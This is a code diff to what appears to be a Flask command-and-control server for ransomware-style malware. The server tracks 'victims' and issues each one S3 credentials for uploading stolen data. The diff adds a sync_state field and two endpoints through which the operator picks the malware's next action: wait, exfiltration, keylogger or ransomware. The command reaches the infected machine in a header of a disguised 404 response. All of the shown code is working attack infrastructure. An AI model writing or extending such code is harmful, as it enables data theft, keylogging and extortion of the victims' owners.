@@ -63,6 +63,7 @@ def createVictim():
             victim_hostname=request.form["hostname"],
             victim_key=victim_key,
             ip_firstContact=request.form["ip"],
+            sync_state=0,
             s3_bucket=s3_credentials["bucket"],
             s3_access_key=s3_credentials["access_key"],
             s3_secret_key=s3_credentials["secret_key"],
@@ -85,6 +86,27 @@ def getS3credentials(victim_id):
     response.headers["S3-Bucket"] = victim.s3_bucket
     response.headers["S3-Access-Key"] = victim.s3_access_key
     response.headers["S3-Secret-Key"] = victim.s3_secret_key
+    return response
+
+
+# When called, writes the next malware step into the DB, so the victim can check for it
+# 0=wait, 1=exfiltration, 2=keylogger, 3=ransomware
+@app.route("/sync/<int:victim_id>/set/<int:mode>", methods=["GET"])
+@auth.login_required
+def setSyncStatus(victim_id, mode):
+    victim = Victim.query.get(victim_id)
+    victim.sync_state = mode
+    db.session.commit()
+    return redirect(url_for("displayIndex"))
+
+
+# Endpoint for next action for the malware
+# 0=wait, 1=exfiltration, 2=keylogger, 3=ransomware
+@app.route("/sync/<int:victim_id>", methods=["GET"])
+def getSyncStatus(victim_id):
+    victim = Victim.query.get(victim_id)
+    response = make_response(render_template("404.html"), 404)
+    response.headers["Action"] = str(victim.sync_state)
     return response
 
 
@@ -146,5 +168,7 @@ def generate_s3_credentials(victim_id):
         f"mclient admin policy add rnsm-minio/ policy-{victim_id} ./app/data/policy-{victim_id}.json"
     )
     # Apply new policy to user
-    os.system(f"mclient admin policy set rnsm-minio/ {victim_id}.json user={victim_id}")
+    os.system(
+        f"mclient admin policy set rnsm-minio/ policy-{victim_id} user={victim_id}"
+    )
     return s3_credentials
